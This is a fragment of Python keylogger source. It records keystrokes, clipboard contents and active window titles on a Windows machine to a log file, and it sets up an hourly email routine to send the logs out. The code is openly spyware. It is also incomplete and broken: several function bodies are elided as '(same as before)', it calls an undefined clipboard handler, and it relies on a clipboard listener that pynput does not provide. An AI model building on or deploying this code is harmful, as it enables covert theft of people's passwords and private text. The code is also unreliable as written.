import os
import platform
from flask import Flask, render_template, send_from_directory
from pynput import keyboard, clipboard
import time
import threading
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
from email.mime.image import MIMEImage
import glob
import win32gui

app = Flask(__name__)

log_file = 'keystrokes_log.txt'
screenshot_folder = 'screenshots/'
email_interval = 3600  # Send email every 1 hour
screenshot_key = keyboard.Key.print_screen
last_email_time = time.time()

current_word = ""
current_line = ""
clipboard_data = ""
active_window_title = ""

def get_active_window_title():
    try:
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    except Exception as e:
        print("Error getting active window title:", e)
        return ""

def on_key_press(key):
    global current_word, current_line, clipboard_data, active_window_title

    # ... (same as before)

    active_window_title = get_active_window_title()

def log_clipboard_change(data):
    try:
        with open(log_file, 'a') as f:
            f.write(f'{time.strftime("%Y-%m-%d %H:%M:%S")} - Clipboard: {data}\n')
    except Exception as e:
        print("Error writing to file:", e)

def log_active_window_change():
    try:
        with open(log_file, 'a') as f:
            f.write(f'{time.strftime("%Y-%m-%d %H:%M:%S")} - Active Window: {active_window_title}\n')
    except Exception as e:
        print("Error writing to file:", e)

def send_email(log_filename):
    try:
        # ... (same as before)

        # Attach active window title
        log_active_window_change()

        # ... (same as before)

    except Exception as e:
        print("Error sending email:", e)

# ... (same as before)

if __name__ == '__main__':
    key_listener = keyboard.Listener(on_press=on_key_press)
    clipboard_listener = clipboard.Listener(on_change=on_clipboard_change)
    key_listener.start()
    clipboard_listener.start()
    app.run(debug=True)  # Run the Flask app in debug mode
